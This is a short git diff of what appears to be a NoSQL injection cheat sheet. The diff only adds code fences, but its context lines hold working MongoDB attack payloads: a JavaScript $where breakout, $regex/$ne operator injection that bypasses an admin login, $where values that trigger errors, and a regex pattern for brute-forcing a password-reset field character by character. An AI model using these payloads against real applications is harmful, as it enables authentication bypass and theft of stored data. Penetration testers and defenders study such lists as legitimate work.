@@ -67,7 +67,7 @@ Extracting Password:
 ' && this.u.s.e.r.n.a.m['e'] && 'a'=='b
 ```
 # Operator Injection To Retrieving Unknown Data
-
+```
 {"username":{"$regex":"admin"},"password":{"$ne":"Invalid"}}
 {"username":{"$regex":"admin"},"password":{"$ne":"Invalid"},"$where":"e"} >> To generate an server error.
 {"username":{"$regex":"admin"},"password":{"$ne":"Invalid"},"$where":"0"} >> To generate a false statement.
@@ -84,3 +84,4 @@ this.forgotpwd.match('^.{0}0.*') >> To fetch specific keyvalue.
 2nd 0 means data size
 3rd 0 means data character
 For bruteforcing select only 2nd and 3rd 0
+```
